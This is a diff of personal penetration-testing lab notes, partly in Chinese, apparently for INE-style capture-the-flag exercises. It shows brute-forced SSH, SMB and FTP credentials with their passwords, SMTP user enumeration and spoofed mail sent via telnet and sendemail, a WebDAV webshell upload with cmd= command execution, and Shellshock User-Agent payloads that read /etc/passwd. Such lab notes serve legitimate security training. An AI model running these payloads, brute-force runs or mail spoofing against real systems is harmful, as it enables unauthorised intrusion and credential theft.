@@ -367,122 +367,116 @@
 	[+] 192.220.149.3:22 - Success: 'sysadmin:hailey' 'uid=1000(sysadmin) gid=1000(sysadmin) groups=1000(sysadmin) Linux demo.ine.local 6.8.0-39-generic #39-Ubuntu SMP PREEMPT_DYNAMIC Fri Jul  5 21:49:14 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux '
 	~~~~~~~~~~~~~~~~~~~~~~~~~~
 	sessions
-	=> 1         shell linux  SSH root @   192.220.149.2:37181 -> 192.220.149.3:22 (192.220.149.3)
+		=> 1         shell linux  SSH root @   192.220.149.2:37181 -> 192.220.149.3:22 (192.220.149.3)
 	sessions -i 1
-	shell
-	find / -name "flag" 2>/dev/null
-	cat /flag
+		shell
+		find / -name "flag" 2>/dev/null
+		cat /flag
 
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	Postfix Recon: Basics
-	SMTP (Simple Mail Transfer Protocol)
-
+# Postfix Recon: Basics
+## SMTP (Simple Mail Transfer Protocol)
 	What is the SMTP server name and banner.
-	=>　nmap -sV -script banner demo.ine.local
-	25/tcp open  smtp    Postfix smtpd
-	|_banner: 220 openmailbox.xyz ESMTP Postfix: Welcome to our mail server.
+		=>　nmap -sV -script banner demo.ine.local
+		25/tcp open  smtp    Postfix smtpd
+		|_banner: 220 openmailbox.xyz ESMTP Postfix: Welcome to our mail server.
 	~~~~~~~~~~~~~~~~~~~~~~~~~~
 	Connect to SMTP service using netcat and retrieve the hostname of the server (domain name).
-	=> nc demo.ine.local 25
-	220 openmailbox.xyz ESMTP Postfix: Welcome to our mail server.
+		=> nc demo.ine.local 25
+		220 openmailbox.xyz ESMTP Postfix: Welcome to our mail server.
 	~~~~~~~~~~~~~~~~~~~~~~~~~~
 	Does user “admin” exist on the server machine? Connect to SMTP service using netcat and check manually.
-	=> VRFY admin@openmailbox.xyz
-	252 2.0.0 admin@openmailbox.xyz
+		=> VRFY admin@openmailbox.xyz
+		252 2.0.0 admin@openmailbox.xyz
 
 	~~~~~~~~~~~~~~~~~~~~~~~~~~
 	Does user “commander” exist on the server machine? Connect to SMTP service using netcat and check manually.
-	=> VRFY commander@openmailbox.xyz
-	550 5.1.1 <commander@openmailbox.xyz>: Recipient address rejected: User unknown in local recipient table
+		=> VRFY commander@openmailbox.xyz
+		550 5.1.1 <commander@openmailbox.xyz>: Recipient address rejected: User unknown in local recipient table
 
 	~~~~~~~~~~~~~~~~~~~~~~~~~~
 	What commands can be used to check the supported commands/capabilities? 
-	Connect to SMTP service using telnet and check.
-	=> telnet demo.ine.local 25
-	220 openmailbox.xyz ESMTP Postfix: Welcome to our mail server.
+		Connect to SMTP service using telnet and check.
+		=> telnet demo.ine.local 25
+		220 openmailbox.xyz ESMTP Postfix: Welcome to our mail server.
 
 	=> HELO attacker.xyz
-	250 openmailbox.xyz
+		250 openmailbox.xyz
 
 	=> EHLO attacker.xyz
-	250-openmailbox.xyz
-	250-PIPELINING
-	250-SIZE 10240000
-	250-VRFY
-	250-ETRN
-	250-STARTTLS
-	250-ENHANCEDSTATUSCODES
-	250-8BITMIME                                                                                                      
-	250-DSN                                                                                                           
-	250 SMTPUTF8     
+		250-openmailbox.xyz
+		250-PIPELINING
+		250-SIZE 10240000
+		250-VRFY
+		250-ETRN
+		250-STARTTLS
+		250-ENHANCEDSTATUSCODES
+		250-8BITMIME                                                                                                      
+		250-DSN                                                                                                           
+		250 SMTPUTF8     
 	~~~~~~~~~~~~~~~~~~~~~~~~~~
 	How many of the common usernames present in the dictionary /usr/share/commix/src/txt/usernames.txt exist on the server. Use smtp-user-enum tool for this task.
-	=>　smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t demo.ine.local
-	 existse.local: admin
-	 existse.local: administrator
-	 existse.local: mail
-	 existse.local: postmaster
-	 existse.local: sales
-	 existse.local: root
-	 existse.local: support
-	demo.ine.local: www-data exists
+		=>　smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t demo.ine.local
+		 existse.local: admin
+		 existse.local: administrator
+		 existse.local: mail
+		 existse.local: postmaster
+		 existse.local: sales
+		 existse.local: root
+		 existse.local: support
+		demo.ine.local: www-data exists
 
 	~~~~~~~~~~~~~~~~~~~~~~~~~~
 	How many common usernames present in the dictionary /usr/share/metasploit-framework/data/wordlists/unix_users.txt exist on the server. Use suitable metasploit module for this task.
 	(Need time to wait)
-	=> msfconsole -q
-	use auxiliary/scanner/smtp/smtp_enum
-	set RHOSTS demo.ine.local
-	exploit
+		=> msfconsole -q
+		use auxiliary/scanner/smtp/smtp_enum
+		set RHOSTS demo.ine.local
+		exploit
 
 	[+] 192.187.152.3:25      - 192.187.152.3:25 Users found: (, _apt,) admin, administrator, backup, bin, daemon, games, gnats, irc, list, lp, mail, man, news, nobody, (postfix), postmaster, proxy, sync, sys, uucp, www-data
 
 	~~~~~~~~~~~~~~~~~~~~~~~~~~
 	Connect to SMTP service using telnet and send a fake mail to root user.
-	=> telnet demo.ine.local 25
-	HELO attacker.xyz
-	mail from: admin@attacker.xyz
-	rcpt to:root@openmailbox.xyz
-	data
-	Subject: Hi Root
-	Hello,
-	This is a fake mail sent using telnet command.
-	From,
-	Admin
-	.
+		=> telnet demo.ine.local 25
+		HELO attacker.xyz
+		mail from: admin@attacker.xyz
+		rcpt to:root@openmailbox.xyz
+		data
+		Subject: Hi Root
+		Hello,
+		This is a fake mail sent using telnet command.
+		From,
+		Admin
+		.
 
 	最後一行有一個點（.），表示資料結束
 
 	~~~~~~~~~~~~~~~~~~~~~~~~~~
 	Send a fake mail to root user using sendemail command.
-	=> sendemail -f admin@attacker.xyz -t root@openmailbox.xyz -s demo.ine.local -u Fakemail -m "Hi root, a fake from admin" -o tls=no
+		=> sendemail -f admin@attacker.xyz -t root@openmailbox.xyz -s demo.ine.local -u Fakemail -m "Hi root, a fake from admin" -o tls=no
 
 ## Assessment Methodologies: Enumeration CTF 1
 
 	提供有關可用共享及其存取權限的資訊 :
 	enum4linux -a target.ine.local
-
-	S-1-22-1-1000 Unix User\josh (Local User)                                                                                                                                                                                                  
-	S-1-22-1-1001 Unix User\bob (Local User)
-	S-1-22-1-1002 Unix User\nancy (Local User)
-	S-1-22-1-1003 Unix User\alice (Local User)
-
-
+		S-1-22-1-1000 Unix User\josh (Local User)
+	 	S-1-22-1-1001 Unix User\bob (Local User)
+		S-1-22-1-1002 Unix User\nancy (Local User)
+		S-1-22-1-1003 Unix User\alice (Local User)
 
 	nano shares.sh
 	chmod +x shares.sh
 	~~~~~~~~~~~~~~~~~~~~~~~~~~
-	#!/bin/bash
-
-	# Define the target and wordlist location
-	TARGET="target.ine.local"
-	WORDLIST="/root/Desktop/wordlists/shares.txt"
+		#!/bin/bash
+		# Define the target and wordlist location
+		TARGET="target.ine.local"
+		WORDLIST="/root/Desktop/wordlists/shares.txt"
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	# Check if the wordlist file exists
-	if [ ! -f "$WORDLIST" ]; then
-	    echo "Wordlist not found: $WORDLIST"
-	    exit 1
-	fi
+		if [ ! -f "$WORDLIST" ]; then
+		    echo "Wordlist not found: $WORDLIST"
+		    exit 1
+		fi
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	# Loop through each share in the wordlist
 	while read -r SHARE; do
@@ -506,11 +500,11 @@
 	nano users.txt
 
 	msfconsole -q
-	use scanner/smb/smb_login
-	set RHOSTS target.ine.local
-	set USER_FILE users.txt
-	set PASS_FILE /root/Desktop/wordlists/unix_passwords.txt
-	run
+		use scanner/smb/smb_login
+		set RHOSTS target.ine.local
+		set USER_FILE users.txt
+		set PASS_FILE /root/Desktop/wordlists/unix_passwords.txt
+		run
 
 	[+] 192.61.167.3:445      - 192.61.167.3:445 - Success: '.\josh:purple'
 	[+] 192.61.167.3:445      - 192.61.167.3:445 - Success: '.\alice:admin'
@@ -525,7 +519,6 @@
 	[5554][ftp] host: target.ine.local   login: alice   password: pretty
 	ftp -p alice@target.ine.local 5554 
 	get
-	~~~~~~~~~~~~~~~~~~~~~~~~~~
 	ssh target.ine.local
 ## Windows: IIS Server DAVTest
 	Davtest 是一個 WebDAV 掃描器 將漏洞利用檔案傳送到 WebDAV 伺服器並自動建立目錄
@@ -536,26 +529,26 @@
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	將重點放在運行 IIS 伺服器的連接埠 80 :
 	nmap --script http-enum -sV -p 80 demo.ine.local
-	| http-enum: 
-	|_  /webdav/: Potentially interesting folder (401 Unauthorized)
+		| http-enum: 
+		|_  /webdav/: Potentially interesting folder (401 Unauthorized)
 
 	davtest -url http://demo.ine.local/webdav
-	OPEN            FAIL:   http://demo.ine.local/webdav    Unauthorized. Basic realm="demo.ine.local"
+		OPEN            FAIL:   http://demo.ine.local/webdav    Unauthorized. Basic realm="demo.ine.local"
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	davtest -auth bob:password_123321 -url http://demo.ine.local/webdav
-	EXEC    asp     SUCCEED: 
-	EXEC    html    SUCCEED:  
-	EXEC    txt     SUCCEED: 
+		EXEC    asp     SUCCEED: 
+		EXEC    html    SUCCEED:  
+		EXEC    txt     SUCCEED: 
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	使用cadaver公用程式將目標電腦上的.asp後門上傳到/webdav目錄
 	cadaver http://demo.ine.local/webdav
-	put /usr/share/webshells/asp/webshell.asp
-	ls
+		put /usr/share/webshells/asp/webshell.asp
+		ls
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	URL: http://demo.ine.local/webdav/webshell.asp
-	=> Command injestion
-	http://demo.ine.local/webdav/webshell.asp?cmd=dir+C%3A%5C
-	http://demo.ine.local/webdav/webshel​​l.asp?cmd=type+C%3A%5Cflag.txt
+		=> Command injestion
+		http://demo.ine.local/webdav/webshell.asp?cmd=dir+C%3A%5C
+		http://demo.ine.local/webdav/webshel​​l.asp?cmd=type+C%3A%5Cflag.txt
 
 ## Shellshock
 	=> OWASP A9 Using Components with Known Vulnerabilities
@@ -564,14 +557,14 @@
 	=> nmap demo.ine.local
 
 	check if the server is vulnerable to shellshock attack　：　
-	=> nmap --script http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" demo.ine.local
-	IDs:  CVE:CVE-2014-6271
+		=> nmap --script http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" demo.ine.local
+		IDs:  CVE:CVE-2014-6271
 
 	https://github.com/opsxcq/exploit-CVE-2014-6271
-	Burp Suite =>proxy =>　send to repeater
-	User-Agent :　() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
-	User-Agent :　() { :; }; echo; echo; /bin/bash -c 'id'
-	User-Agent :　() { :; }; echo; echo; /bin/bash -c 'ps -ef'
+	Burp Suite => proxy =>　send to repeater
+		User-Agent :　() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
+		User-Agent :　() { :; }; echo; echo; /bin/bash -c 'id'
+		User-Agent :　() { :; }; echo; echo; /bin/bash -c 'ps -ef'
 ## Web App Vulnerability Scanning With WMAP
 	識別 Web 伺服器上的錯誤配置和可利用的漏洞
 
